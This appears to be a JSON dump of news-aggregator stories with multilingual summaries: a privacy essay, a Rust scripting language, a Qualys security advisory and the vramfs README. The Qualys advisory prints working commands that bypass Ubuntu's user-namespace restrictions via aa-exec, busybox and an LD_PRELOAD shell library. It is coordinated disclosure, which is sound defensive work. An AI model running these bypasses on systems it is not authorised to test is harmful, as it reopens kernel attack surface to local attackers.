its existence in case there’s a complaint or an investigation in the future.\"How did you manage to get those data while your product says it will not send data?\".\nBut, once again, any tech person knows that pushing a button in an interface is not a proof of anything in the underlying software.\nPlease stop being naive about Apple\nThat’s also the point with Apple: Apple is such a big company that the right hand has no idea about what the left hand is doing. Some privacy people are working at Apple and doing good job. But their work is continuously diluted through the interests of quick and cheap production, marketing, release, new features, gathering data for advertising purpose. Apple is not a privacy company and has never been: it is an opportunistic company which advertise privacy when it feels it could help sell more iPhones. But deeply inside, they absolutely don’t care and they will absolutely trade the (very little) privacy they have if it means selling more.\nSometimes, geek naivety is embarrassingly stupid. Like \"brand loyalty\". Marketing lies to you. As a rule of thumb, the bigger the company, the bigger the lie. In tech, there’s no way for a big company to not lie because marketers have no real understanding of they are selling. Do you really think that people who chose to advertise \"privacy\" at Apple have any strong knowledge about \"privacy\"? That they could simply give you a definition of \"privacy\"?\nI know that intelligent people go to great intellectual contortions to justify buying the latest overpriced spying shiny coloured screen with an apple logo. It looks like most humans actively look to see their freedom restricted. Seirdy calls it \"the domestication of users\".\n\nWhatsApp and the domestication of users (seirdy.one)\n\nAnd that’s why I see Apple as a cult: most tech people cannot be reasoned about it.\n\nThe Cost of Being Convinced (ploum.net)\n\nYou can’t find a technical solution to a lie\nBill Cole, contributor to Spamassassin, recently posted on Mastodon that the whole DNS stack to protect spammers was not working.\n spammers are more consistent at making SPF, DKIM, and DMARC correct than are legitimate senders.\n\n🆘Bill Cole 🇺🇦: \"@jwz@mastodon.social The stats we collect for the…\" (toad.social)\n\nIt is, once again, a naive approach to spam. The whole stack was designed with the mindset \"bad spammers will try to hide themselves\". But was is happening in your inbox, really?\nMost spam is not \"black hat spam\". It is what I call \"white-collar spam\": perfectly legitimate company, sending you emails from legitimate address. You slept in a hotel during a business trip? Now you will receive weekly emails about our hotel for the rest of your life. And it is the same for any shop, any outlet, anything you have done. Your inbox is filled with \"white-collar\" junk. And they know this perfectly well.\nIn Europe, we have a rule, the RGPD, which forbid businesses to keep your data without your express consent. I did the experiment for several months to send a legal threat to every single white-collar spam I received. Guess what: they always replied that it was a mistake, that I was now removed, that it should not have happened, that I checked the box (which was false but how could I prove it?) or even, on one occasion, that they restored a backup containing my email before I unsubscribed (I unsubscribed from that one 10 years before, which makes it very unlikely).\nIn short, they lied. All of them. All of them are spammers and they lie pretending that \"they thought you were interested\".\nIn one notable case, they told me that they had erased all my data while, still having the cookie on my laptop, I could see and use my account. Thirty days later, I was still connected and I figured that they simply managed to change my user id from \"ploum\" to \"deleted_ploum\" in the database. While answering me straight in the face that they had no information about me in their database.\nCorporations are lying. You must treat every corporate word as a straight lie until proved otherwise.\nBut Ploum, if all marketing is a lie, why trusting Signal?\nIf you can’t trust marketing, why do I use Signal and Protonmail?\nFirst of all, Signal is open source. And, yes, I’ve read some of the source code for some feature I was interested in. I’ve also read through some very deep audit of Signal source code.\n\nReviewing the Cryptography Used by Signal (soatok.blog)\n\nI’m also trusting the people behind Signal. I’m trusting people who recommend Signal. I’m trusting the way Signal is built.\nBut most importantly, Signal sole existence is to protect privacy of its users. It’s not even a corporation and, yes, this is important.\nYes, they could lie in their marketing. Like Telegram did (and still does AFAIK). But this would undermine their sole reason to exist.\nI don’t say that Signal is perfect: I say I trust them to believe themselves what they announce. For now.\nWhat about Protonmail?\nFor the same reasons, Protonmail can, to some extent, be trusted. Technically, they can access most of the emails of their customers (because those emails arrive unencrypted to PM’s servers). But I trust Protonmail not to sell any data because if there’s any doubt that they do it, the whole business will crumble. They have a strong commercial incentive to do everything they can to protect my data. I pay them for that. It’s not a \"checkbox\" they could remove, it’s their whole raison d’être.\nThis is also why I pay for Kagi as my search engine: their business incentive is to provide me the best search results with less slop, less advertising. As soon as they start doing some kind of advertising, I will stop paying them and they know it. Or if Kagi starts becoming to AI centric for my taste, like they did for Lori:\n\nWhy I Lost Faith in Kagi (d-shoot.net)\n\nI don’t blindly trust companies. Paying them is not a commitment to obey them, au contraire. Every relation with a commercial entity is, by essence, temporary. I pay for a service with strings attached. If the service degrade, if my conditions are not respected, I stop paying. If I’m not convinced they can be trusted, I stop paying them. I know I can pay and still be the product. If I have any doubt, I don’t pay. I try to find an alternative and migrate to it. Email being critical to me, I always have two accounts on two different trustable providers with an easy migrating path (which boils down to changing my DNS config).\nFighting the Androidification\nCory Doctorow speaks a lot about enshitification. Where users are more and more exploited. But one key component of a good enshitification is what I call \"Androidification\".\nAndroidification is not about degrading the user experience. It’s about closing doors, removing special use cases, being less and less transparent. It’s about taking open source software and frog boiling it to a full closed proprietary state while killing all the competition in the process.\nAndroid was, at first, an Open Source project. With each release, it became more closed, more proprietary. As I explain in my \"20 years of Linux on the Desktop\" essay, I believe it has always been part of the plan. Besides the Linux kernel, Google was always wary not to include any GPL or LGPL licensed library in Android.\n\n20 years of Linux on the Desktop (part 3) (ploum.net)\n\nIt took them 15 years but they finally achieved killing the Android Open Source Project:\n\nGoogle will develop the Android OS fully in private, here's why (www.androidauthority.com)\n\nThis is why I’m deeply concerned by the motivation of Canonical to switch Ubuntu’s coreutils to an MIT licensed version.\n\nUbuntu 25.10 plans to swap GNU coreutils for Rust (go.theregister.com)\n\nThis is why I’m deeply concerned that Protonmail quietly removed the issue tracker from its Protonmail Bridge Github page (making the development completely opaque for what is an essential tool for technical Protonmail users).\nI mean, commons!\nThis whole naivety is also why I’m deeply concerned by very intelligent and smart tech people not understanding what \"copyleft\" is, why it is different from \"open source\" and why they should care.\n\nWe need more of Richard Stallman, not less (ploum.net)\n\nCorporations are not your friend. They never were. They lie. The only possible relationship with them is an opportunistic one. And if you want to build commons that they cannot steal, you need strong copyleft.\n\nOn Open Source and the Sustainability of the Commons (ploum.net)\n\nBut firstly, my fellow geeks, you need to lose your candid naivety.\nI mean, come on, let’s build the commons!\n\nI’m Ploum, a writer and an engineer. I like to explore how technology impacts society. You can subscribe by email or by rss. I value privacy and never share your adress.\nI write science-fiction novels in French. For Bikepunk, my new post-apocalyptic-cyclist book, my publisher is looking for contacts in other countries to distribute it in languages other than French. If you can help, contact me!",
    "summary": {
      "en": "The article discusses the naivety of tech enthusiasts regarding privacy and corporate practices, particularly in relation to Amazon's Alexa and Apple. \n\nKey points include:\n\n1. **Privacy Betrayal**: Amazon's decision to continuously send audio to its servers surprised many, but the author argues that users should have expected this, as the primary goal of such devices is data collection.\n\n2. **Marketing Misinformation**: The author criticizes the belief that companies like Apple genuinely protect user privacy, suggesting that marketing often misrepresents reality. He believes big companies prioritize profit over user privacy.\n\n3. **Spamming and Data Misuse**: The article highlights how legitimate companies often contribute to spam by misusing customer data and lying about consent, emphasizing the need for skepticism towards corporate claims.\n\n4. **Trust in Alternatives**: The author trusts services like Signal and Protonmail because they are built to protect user privacy and have strong incentives to do so, unlike larger corporations.\n\n5. **Corporate Relationships**: The relationship with companies should be viewed as opportunistic, and users should be prepared to switch services if they feel their privacy is compromised.\n\n6. **Concerns about Open Source**: The author warns against the \"Androidification\" of open-source projects, where transparency and user control are gradually reduced.\n\nUltimately, the author urges tech enthusiasts to be more critical of companies and their practices, advocating for stronger protections of user data and promoting the idea of building a commons that cannot be exploited by corporations.",
      "ko": "이 기사는 기술 애호가들이 개인 정보 보호와 기업 관행에 대해 얼마나 순진한지를 다루고 있습니다. 특히 아마존의 알렉사와 애플에 대한 내용이 중심입니다.\n\n첫 번째로, 아마존이 지속적으로 음성을 서버로 전송하기로 한 결정은 많은 사람들을 놀라게 했습니다. 하지만 저자는 이러한 장치의 주된 목적이 데이터 수집이라는 점에서 사용자들이 이를 예상했어야 한다고 주장합니다.\n\n두 번째로, 저자는 애플과 같은 기업들이 진정으로 사용자 개인 정보를 보호한다고 믿는 것에 대해 비판합니다. 그는 마케팅이 현실을 왜곡하는 경우가 많다고 지적하며, 대기업들이 사용자 개인 정보보다 이익을 우선시한다고 믿고 있습니다.\n\n세 번째로, 기사는 합법적인 기업들이 고객 데이터를 잘못 사용하고 동의에 대해 거짓말을 하면서 스팸을 유발하는 경우가 많다고 강조합니다. 따라서 기업의 주장에 대해 회의적인 시각을 가져야 한다고 말합니다.\n\n네 번째로, 저자는 시그널과 프로톤메일과 같은 서비스에 신뢰를 두고 있습니다. 이들 서비스는 사용자 개인 정보를 보호하기 위해 설계되었으며, 대기업과는 달리 이를 위한 강력한 유인이 있다고 설명합니다.\n\n다섯 번째로, 기업과의 관계는 기회주의적으로 바라봐야 하며, 사용자는 개인 정보가 침해당한다고 느낄 경우 서비스를 변경할 준비를 해야 한다고 강조합니다.\n\n마지막으로, 저자는 오픈 소스 프로젝트의 \"안드로이드화\"에 대해 경고합니다. 이는 투명성과 사용자 통제가 점차 줄어드는 현상을 의미합니다.\n\n결국 저자는 기술 애호가들이 기업과 그들의 관행에 대해 더 비판적으로 접근할 것을 촉구하며, 사용자 데이터 보호를 강화하고 기업이 착취할 수 없는 공공 자원을 구축할 필요성을 강조합니다.",
      "ja": "この記事では、テクノロジー愛好者がプライバシーや企業の実態について抱く無邪気さについて論じています。特に、AmazonのAlexaやAppleに関連する内容が取り上げられています。\n\nまず、Amazonが音声データを常にサーバーに送信する決定について、多くの人が驚いたと述べています。しかし、著者はこうしたデバイスの主な目的がデータ収集であるため、ユーザーはこの事実を予想すべきだったと主張しています。\n\n次に、著者はAppleのような企業が本当にユーザーのプライバシーを守っているという信念を批判しています。マーケティングが現実を誤解させることが多く、大企業はユーザーのプライバシーよりも利益を優先していると考えています。\n\nまた、正当な企業が顧客データを悪用し、同意について嘘をつくことでスパムを助長していることも指摘されています。企業の主張に対しては懐疑的であるべきだと強調しています。\n\n著者は、SignalやProtonmailのようなサービスを信頼しています。これらのサービスはユーザーのプライバシーを守るために設計されており、大企業とは異なり、そのための強いインセンティブがあります。\n\n企業との関係は機会主義的に捉えるべきであり、ユーザーはプライバシーが侵害されていると感じた場合にはサービスを切り替える準備をしておくべきだと述べています。\n\n最後に、オープンソースプロジェクトの「Android化」について警告しています。これは透明性やユーザーのコントロールが徐々に減少することを意味します。\n\n著者は、テクノロジー愛好者に対して企業やその実態に対してもっと批判的になるよう促し、ユーザーデータの保護を強化し、企業に利用されない共通の場を築くことを提唱しています。"
    }
  },
  {
    "id": "795871cb15efbc39",
    "title": {
      "en": "Koto Programming Language",
      "ko": "코토 프로그래밍",
      "ja": "コトプログラミング"
    },
    "type": "story",
    "url": "https://koto.dev/",
    "score": 140,
    "by": "virtualritz",
    "time": 1743250488,
    "content": "A lightweight scripting language for Rust applications.\n\n    About\n\n    Docs\n\n    Install\n\n    Playground",
    "summary": {
      "en": "This text introduces a lightweight scripting language designed for Rust applications. It includes sections for more information, documentation, installation instructions, and a playground for trying out the language.",
      "ko": "이 텍스트는 Rust 애플리케이션을 위해 설계된 경량 스크립팅 언어를 소개합니다. 이 언어에 대한 추가 정보, 문서, 설치 방법, 그리고 언어를 실험해볼 수 있는 놀이터 섹션이 포함되어 있습니다.",
      "ja": "このテキストでは、Rustアプリケーション向けに設計された軽量スクリプト言語について紹介しています。詳細情報、ドキュメント、インストール手順、そして言語を試すためのプレイグラウンドのセクションが含まれています。"
    }
  },
  {
    "id": "5a1d47062f052f14",
    "title": {
      "en": "OSS-SEC: Three bypasses of Ubuntu's unprivileged user namespace restrictions",
      "ko": "우분투 사용자 네임스페이스 우회법 3가지",
      "ja": "Ubuntuの脆弱性発見"
    },
    "type": "story",
    "url": "https://seclists.org/oss-sec/2025/q1/253",
    "score": 43,
    "by": "birdculture",
    "time": 1743275264,
    "content": "oss-sec\nmailing list archives\n\nBy Date\n\nBy Thread\n\nThree bypasses of Ubuntu's unprivileged user namespace restrictions\n\nFrom: Qualys Security Advisory <qsa () qualys com>\n\nDate: Thu, 27 Mar 2025 17:44:15 +0000\n\nQualys Security Advisory\n\nThree bypasses of Ubuntu's unprivileged user namespace restrictions\n\n========================================================================\nContents\n========================================================================\n\nSummary\nBypass via aa-exec\nBypass via busybox\nBypass via LD_PRELOAD\nAcknowledgments\nTimeline (advisory sent to the Ubuntu Security Team on January 15, 2025)\n\n------------------------------------------------------------------------\n  Prologue, from https://grsecurity.net/10_years_of_linux_security.pdf:\n\n    + February 2013 (v3.8) - Unprivileged User Namespace support added\n      - Greatly increased kernel attack surface, exposed many interfaces\n        that previously saw little security scrutiny\n\n    + Attack surface exposed by unprivileged user namespaces isn't\n      decreasing anytime soon\n      - Even more functionality being exposed\n------------------------------------------------------------------------\n\n========================================================================\nSummary\n========================================================================\n\nUbuntu 23.10 introduced unprivileged user namespace restrictions (the\nsysctl kernel.apparmor_restrict_unprivileged_userns) and Ubuntu 24.04\nenabled them by default. From Alex Murray's excellent blog post at\nhttps://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts:\n\n  \"Unprivileged user namespaces are a widely used feature of the Linux\n  kernel, providing additional security isolation for applications, and\n  are often employed as part of a sandbox environment. However, [...]\n  unprivileged user namespaces also expose additional attack surfaces\n  within the Linux kernel. There has been a long history of (ab)use of\n  unprivileged user namespaces to exploit various kernel\n  vulnerabilities.\n\n  For Ubuntu 24.04 LTS, the use of unprivileged user namespaces is then\n  allowed for all applications but access to any additional permissions\n  within the namespace are denied. This allows more applications to more\n  gracefully handle this default restriction whilst still protecting\n  against the abuse of user namespaces to gain access to additional\n  attack surfaces within the Linux kernel.\"\n\nUnfortunately, we discovered three different bypasses of these\nunprivileged user namespace restrictions; each bypass allows a local\nattacker to create user namespaces with full administrator capabilities,\nand therefore to still exploit vulnerabilities in kernel components that\nrequire capabilities such as CAP_SYS_ADMIN or CAP_NET_ADMIN:\n\n- An unprivileged local attacker can simply use the aa-exec tool (which\n  is installed by default on Ubuntu) to transition to one of the many\n  pre-configured AppArmor profiles that do allow the creation of user\n  namespaces with full capabilities (for example, the chrome, flatpak,\n  or trinity profile).\n\n- An unprivileged local attacker can first execute a busybox shell,\n  which is installed by default on Ubuntu, and is one of the programs\n  whose pre-configured AppArmor profile does allow the creation of user\n  namespaces with full capabilities.\n\n- An unprivileged local attacker can LD_PRELOAD a shell into one of the\n  programs whose pre-configured AppArmor profile does allow the creation\n  of user namespaces with full capabilities (for example, nautilus is\n  installed by default on Ubuntu Desktop).\n\nClarification: such a bypass allows an unprivileged user to obtain full\ncapabilities *inside* a namespace, not on the host outside a namespace;\nfor comparison, a bypass is not even needed on most Linux distributions,\nbecause they allow unprivileged users to obtain full capabilities inside\nnamespaces by default (and therefore to exploit CAP_SYS_ADMIN kernel\nvulnerabilities for example), without any restriction at all.\n\nFor more information on these bypasses and user namespace restrictions,\nplease refer to Ubuntu's post at:\n\n  https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction\n\n========================================================================\nBypass via aa-exec\n========================================================================\n\n    Are we all just algorithms doing what we're supposed to do or can we\n    escape our programming?\n        -- Jude, The Matrix Resurrections\n\nWhile working on needrestart, particularly on commit e17b564 (\"core: fix\nregression of false positives for processes running in chroot or mountns\n(#317)\"), we tried to experiment with user and mount namespaces, but to\nour great surprise we were barred from creating them as an unprivileged\nuser on Ubuntu 24.04 (although kernel.unprivileged_userns_clone is\nenabled by default):\n\n------------------------------------------------------------------------\n$ id\nuid=1001(tiffany) gid=1001(tiffany) groups=1001(tiffany),100(users)\n\n$ unshare -U -r -m /bin/sh\nunshare: write failed /proc/self/uid_map: Operation not permitted\n------------------------------------------------------------------------\n\nThis error message looked very suspicious to us, so we decided to try\nthe userns_child_exec tool (from man user_namespaces) instead of the\npre-installed unshare tool:\n\n------------------------------------------------------------------------\n$ ./userns_child_exec -U -z -m /bin/sh\n\n# id\nuid=0(root) gid=0(root) groups=0(root),65534(nogroup)\n\n# mount --bind /etc/passwd /etc/passwd\nmount: /etc/passwd: bind /etc/passwd failed.\n       dmesg(1) may have more information after failed mount system call.\n------------------------------------------------------------------------\n\nThis time we were able to create a user and mount namespace, but to our\ngrowing surprise we were barred from using any administrator capability\ninside this namespace (our mount command failed). Puzzled, we eventually\nfound out that these restrictions were introduced in Ubuntu 23.10, and\nenabled by default in Ubuntu 24.04, to prevent unprivileged local\nattackers from exploiting kernel vulnerabilities that require\ncapabilities (CAP_SYS_ADMIN, CAP_NET_ADMIN, etc):\n\n  https://discourse.ubuntu.com/t/spec-unprivileged-user-namespace-restrictions-via-apparmor-in-ubuntu-23-10\n\nTo bypass these restrictions, we immediately tried to run unshare\nthrough aa-exec, to transition to one of Ubuntu's many AppArmor profiles\nthat do allow the creation of user namespaces with full capabilities;\nfor example, the trinity profile:\n\n------------------------------------------------------------------------\n$ grep userns /etc/apparmor.d/trinity\n  userns,\n\n$ aa-exec -p trinity -- unshare -U -r -m /bin/sh\n\n# mount --bind /etc/passwd /etc/passwd\n\n# mount\n...\n/dev/sda2 on /etc/passwd type ext4 (rw,relatime)\n------------------------------------------------------------------------\n\nAt last, we were able to create a user namespace with full capabilities\n(our mount command succeeded). We later noticed that a quick fix to this\nparticular bypass was already mentioned on Ubuntu's excellent security\npodcast in October 2023, but unfortunately it was never enabled by\ndefault; from https://ubuntusecuritypodcast.org/episode-211/:\n\n  \"From a defensive security point of view, also is useful to enable an\n  additional sysctl to ensure that anything which is unconfined can't\n  just abuse these profiles by aa-exec'ing themselves via that profile -\n  so then also need to enable the\n  kernel.apparmor_restrict_unprivileged_unconfined = 1 sysctl too\"\n\n========================================================================\nBypass via busybox\n========================================================================\n\n    I'm living inside a computer-generated reality that has imprisoned\n    me... again.\n        -- Thomas, The Matrix Resurrections\n\nLet us now suppose that our bypass via aa-exec is fixed (i.e.,\nkernel.apparmor_restrict_unprivileged_unconfined is enabled): can we\nfind another way to bypass Ubuntu's unprivileged user namespace\nrestrictions?\n\nThe only program that is installed by default on both Ubuntu Server and\nUbuntu Desktop, and whose pre-configured AppArmor profile does allow the\ncreation of user namespaces with full capabilities, is busybox.\n\nWe therefore simply tried to execute unshare through busybox's built-in\nshell, and lo and behold, we were again able to create a user namespace\nwith full capabilities (our mount command succeeded):\n\n------------------------------------------------------------------------\n$ grep userns /etc/apparmor.d/busybox\n  userns,\n\n$ busybox sh\n\n~ $ /usr/bin/unshare -U -r -m /bin/sh\n\n# mount --bind /etc/passwd /etc/passwd\n\n# mount\n...\n/dev/sda2 on /etc/passwd type ext4 (rw,relatime)\n------------------------------------------------------------------------\n\n========================================================================\nBypass via LD_PRELOAD\n========================================================================\n\n    You're going to imprison me after I just got free?\n        -- Neo, The Matrix Resurrections\n\nLet us now suppose that our bypasses via aa-exec and busybox are both\nfixed: can we find another way to bypass Ubuntu's unprivileged user\nnamespace restrictions?\n\nBesides busybox, the only other program that is installed by default on\nUbuntu Desktop, and whose pre-configured AppArmor profile does allow the\ncreation of user namespaces with full capabilities, is nautilus.\n\nAlthough nautilus may or may not provide a shell functionality like\nbusybox, we can actually take a more general approach: we can simply\nLD_PRELOAD a small library into nautilus, which then executes a shell.\nAnd again, we are able to create a user namespace with full capabilities\n(our mount command succeeds):\n\n------------------------------------------------------------------------\n$ grep userns /etc/apparmor.d/nautilus\n  userns,\n\n$ cat > shell.c << \"EOF\"\n#include <unistd.h>\nstatic void __attribute__ ((constructor)) _init (void) {\n    static char * const argv[] = { \"/bin/sh\", NULL };\n    static char * const envp[] = { NULL };\n    execve(*argv, argv, envp);\n    _exit(__LINE__);\n}\nEOF\n\n$ gcc -fpic -shared -o shell.so shell.c\n\n$ LD_PRELOAD=./shell.so /usr/bin/nautilus\n\n$ unshare -U -r -m /bin/sh\n\n# mount --bind /etc/passwd /etc/passwd\n\n# mount\n...\n/dev/sda2 on /etc/passwd type ext4 (rw,relatime)\n------------------------------------------------------------------------\n\n========================================================================\nAcknowledgments\n========================================================================\n\nWe thank the Ubuntu Security Team for their work on this coordinated\nrelease.\n\n========================================================================\nTimeline\n========================================================================\n\n2025-01-15: We sent our advisory to the Ubuntu Security Team.\n\n2025-03-21: We noticed that @roddux (on X/Twitter) independently\ndiscovered and published the busybox bypass.\n\n2025-03-27: Coordinated release.\n\nBy Date\n\nBy Thread\n\nCurrent thread:\n\nThree bypasses of Ubuntu's unprivileged user namespace restrictions Qualys Security Advisory (Mar 27)",
    "summary": {
      "en": "**Summary of Ubuntu's User Namespace Bypasses**\n\nQualys Security Advisory reported three methods to bypass Ubuntu's restrictions on unprivileged user namespaces, which were introduced to enhance security in Ubuntu 23.10 and enabled by default in Ubuntu 24.04. These restrictions aim to prevent unprivileged users from exploiting kernel vulnerabilities.\n\n1. **Bypass via aa-exec**: An attacker can use the `aa-exec` tool to switch to certain AppArmor profiles (like chrome or flatpak) that allow full capabilities, enabling the creation of user namespaces.\n\n2. **Bypass via BusyBox**: The BusyBox shell, which is installed by default, also allows the creation of user namespaces with full capabilities. An attacker can access it to bypass the restrictions.\n\n3. **Bypass via LD_PRELOAD**: By using the LD_PRELOAD mechanism with the Nautilus program, another default application, an attacker can execute a shell that creates user namespaces with full capabilities.\n\nThese bypasses effectively grant unprivileged users administrative capabilities within user namespaces, which can lead to exploitation of kernel vulnerabilities. For more technical details, refer to Ubuntu's discussions on the topic. \n\nThe advisory was sent to the Ubuntu Security Team on January 15, 2025, and a coordinated release of information occurred on March 27, 2025.",
      "ko": "Qualys 보안 자문에서는 Ubuntu 23.10에서 도입된 비특권 사용자 네임스페이스에 대한 제한을 우회할 수 있는 세 가지 방법을 보고했습니다. 이 제한은 Ubuntu 24.04에서 기본적으로 활성화되어 있으며, 비특권 사용자가 커널 취약점을 악용하는 것을 방지하기 위해 설계되었습니다.\n\n첫 번째 방법은 `aa-exec` 도구를 이용한 우회입니다. 공격자는 특정 AppArmor 프로필(예: chrome 또는 flatpak)로 전환하여 전체 기능을 사용할 수 있게 되어 사용자 네임스페이스를 생성할 수 있습니다.\n\n두 번째 방법은 기본적으로 설치된 BusyBox 셸을 이용한 우회입니다. 이 셸은 전체 기능을 가진 사용자 네임스페이스 생성을 허용하며, 공격자는 이를 통해 제한을 우회할 수 있습니다.\n\n세 번째 방법은 LD_PRELOAD 메커니즘을 Nautilus 프로그램과 함께 사용하는 것입니다. Nautilus는 또 다른 기본 애플리케이션으로, 공격자는 이를 통해 전체 기능을 가진 사용자 네임스페이스를 생성하는 셸을 실행할 수 있습니다.\n\n이러한 우회 방법은 비특권 사용자에게 사용자 네임스페이스 내에서 관리 권한을 부여하게 되어 커널 취약점을 악용할 수 있는 가능성을 높입니다. 더 자세한 기술적 내용은 Ubuntu의 관련 논의를 참고하시기 바랍니다.\n\n이 자문은 2025년 1월 15일 Ubuntu 보안 팀에 전달되었으며, 2025년 3월 27일에 정보가 조정되어 공개되었습니다.",
      "ja": "Qualys Security Advisoryは、Ubuntuの制限を回避するための3つの方法を報告しました。これらの制限は、Ubuntu 23.10で導入され、Ubuntu 24.04ではデフォルトで有効になっています。目的は、特権のないユーザーがカーネルの脆弱性を悪用するのを防ぐことです。\n\n最初の方法は、`aa-exec`ツールを利用するものです。攻撃者は特定のAppArmorプロファイル（例えば、chromeやflatpak）に切り替えることで、完全な機能を持つユーザー名前空間を作成できます。\n\n次に、BusyBoxを利用する方法があります。デフォルトでインストールされているBusyBoxシェルも、完全な機能を持つユーザー名前空間を作成することができます。攻撃者はこれにアクセスして制限を回避できます。\n\n最後の方法は、LD_PRELOADメカニズムを使用してNautilusプログラムを利用するものです。このプログラムもデフォルトでインストールされており、攻撃者は完全な機能を持つユーザー名前空間を作成するシェルを実行できます。\n\nこれらの回避策により、特権のないユーザーがユーザー名前空間内で管理者の権限を持つことができ、カーネルの脆弱性を悪用する可能性があります。詳細な技術情報については、Ubuntuの関連ディスカッションを参照してください。\n\nこのアドバイザリーは2025年1月15日にUbuntuセキュリティチームに送信され、2025年3月27日に情報が共同で公開されました。"
    }
  },
  {
    "id": "660830ccbaefe1c9",
    "title": {
      "en": "Vramfs: Vram Based Filesystem for Linux",
      "ko": "브램FS: 리눅스용 VRAM 파일 시스템",
      "ja": "Vramfs: Linuxの新ファイルシステム"
    },
    "type": "story",
    "url": "https://github.com/Overv/vramfs",
    "score": 86,
    "by": "signa11",
    "time": 1743270672,
    "content": "vramfs\nUnused RAM is wasted RAM, so why not put some of that VRAM in your graphics card\nto work?\nvramfs is a utility that uses the FUSE library\nto create a file system in VRAM. The idea is pretty much the same as a ramdisk,\nexcept that it uses the video RAM of a discrete graphics card to store\nfiles. It is not intented for serious use, but it does actually work fairly\nwell, especially since consumer GPUs with 4GB or more VRAM are now available.\nOn the developer's system, the continuous read performance is ~2.4 GB/s and\nwrite performance 2.0 GB/s, which is about 1/3 of what is achievable with a\nramdisk. That is already decent enough for a device not designed for large data\ntransfers to the host, but future development should aim to get closer to the\nPCI-e bandwidth limits. See the benchmarks section for more info.\nRequirements\n\nLinux with kernel 2.6+\nFUSE development files\nA graphics card with support for OpenCL 1.2\n\nBuilding\nFirst, install the OpenCL driver for your graphics card and verify that it's\nrecognized as an OpenCL device by running clinfo. Then install the libfuse3-dev\npackage or build it from source. You will also need pkg-config and OpenCL\ndevelopment files, (opencl-dev, opencl-clhpp-headers package or equivalent),\nwith version 1.2 of the OpenCL headers at least.\nJust run make to build vramfs.\nIf you want to debug with valgrind, you should compile with the minimal fake\nOpenCL implementation to avoid filling your screen with warnings caused by the\nOpenCL driver:\n\nvalgrind: make DEBUG=1\n\nMounting\nMount a disk by running bin/vramfs <mountdir> <size>. The mountdir can be\nany empty directory. The size is the disk size in bytes. For more information,\nrun bin/vramfs without arguments.\nThe recommended maximum size of a vramdisk is 50% of your VRAM. If you go over\nthat, your driver or system may become unstable because it has to start\nswapping. For example, webpages in Chrome will stop rendering properly.\nIf the disk has been inactive for a while, the graphics card will likely lower\nits memory clock, which means it'll take a second to get up to speed again.\nImplementation\nThe FUSE library is used to implement vramfs as a user space file system. This\neases development and makes working with APIs such as OpenCL straightforward.\nBasic architecture\n\nWhen the program is started, it checks for an OpenCL capable GPU and attempts to\nallocate the specified amount of memory. Once the memory has been allocated, the\nroot entry object is created and a global reference to it is stored.\nFUSE then forwards calls like stat, readdir and write to the file system\nfunctions. These will then locate the entry through the root entry using the\nspecified path. The required operations will then be performed on the entry\nobject. If the entry is a file object, the operation may lead to OpenCL\ncvEnqueueReadBuffer or cvEnqueueWriteBuffer calls to manipulate the data.\nWhen a file is created or opened, a file_session object is created to store\nthe reference to the file object and any other data that is persistent between\nan fopen and fclose call.\nVRAM block allocation\nOpenCL is used to allocate blocks of memory on the graphics card by creating\nbuffer objects. When a new disk is mounted, a pool of disk size / block size\nbuffers is created and initialised with zeros. That is not just a good practice,\nbut it's also required with some OpenCL drivers to check if the VRAM required\nfor the block is actually available. Unfortunately Nvidia cards don't support\nOpenCL 1.2, which means the cvEnqueueFillBuffer call has to be simulated by\ncopying from a preallocated buffer filled with zeros. Somewhat interestingly, it\ndoesn't seem to make a difference in performance on cards that support both.\nWrites to blocks are generally asynchronous, whereas reads are synchronous.\nLuckily, OpenCL guarantees in-order execution of commands by default, which\nmeans reads of a block will wait for the writes to complete. OpenCL 1.1 is\ncompletely thread safe, so no special care is required when sending commands.\nBlock objects are managed using a shared_ptr so that they can automatically\nreinsert themselves into the pool on deconstruction.\nFile system\nThe file system is a tree of entry_t objects with members for attributes like\nthe parent directory, mode and access time. Each type of entry has its own\nsubclass that derives from it: file_t, dir_t and symlink_t. The main file\nthat implements all of the FUSE callbacks has a permanent reference to the root\ndirectory entry.\nThe file_t class contains extra write, read and size methods and manages\nthe blocks to store the file data.\nThe dir_t class has an extra unordered_map that maps names to entry_t\nreferences for quick child lookup using its member function find.\nFinally, the symlink_t class has an extra target string member that stores\nthe pointer of the symlink.\nAll of the entry objects are also managed using shared_ptr so that an object\nand its data (e.g. file blocks) are automatically deallocated when they're\nunlinked and no process holds a file handle to them anymore. This can also be\nused to easily implement hard links later on.\nThe classes use getter/setter functions to automatically update the access,\nmodification and change times at the appropriate moment. For example, calling\nthe children member function of dir_t changes the access time and change\ntime of the directory.\nThread safety\nUnfortunately most of the operations are not thread safe, so all of the FUSE\ncallbacks share a mutex to ensure that only one thread is mutating the file\nsystem at a time. The exceptions are read and write, which will temporarily\nrelease the lock while waiting for a read or write to complete.\nBenchmarks\nThe system used for testing has the following specifications:\n\nOS: Ubuntu 14.04.01 LTS (64 bit)\nCPU: Intel Core i5-2500K @ 4.0 Ghz\nRAM: 8GB DDR3-1600\nGPU: AMD R9 290 4GB (Sapphire Tri-X)\n\nPerformance of continuous read, write and write+sync has been measured for\ndifferent block allocation sizes by creating a new 2GiB disk for each new size\nand reading/writing a 2GiB file.\nThe disk is created using:\nbin/vramfs /tmp/vram 2G\n\nAnd the file is written and read using the dd command:\n# write\ndd if=/dev/zero of=/tmp/vram/test bs=128K count=16000\n\n# write+sync\ndd if=/dev/zero of=/tmp/vram/test bs=128K count=16000 conv=fdatasync\n\n# read\ndd if=/tmp/vram/test of=/dev/null bs=128K count=16000\n\nThese commands were repeated 5 times for each block size and then averaged to\nproduce the results shown in the graph. No block sizes lower than 32KiB could\nbe tested because the driver would fail to allocate that many OpenCL buffers.\nThis may be solved in the future by using subbuffers.\n\nAlthough 128KiB blocks offers the highest performance, 64KiB may be preferable\nbecause of the lower space overhead.\nFuture ideas\n\nImplement RAID-0 for SLI/Crossfire setups\n\nLicense\nThe MIT License (MIT)\n\nCopyright (c) 2014 Alexander Overvoorde\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to\ndeal in the Software without restriction, including without limitation the\nrights to use, copy, modify, merge, publish, distribute, sublicense, and/or\nsell copies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF 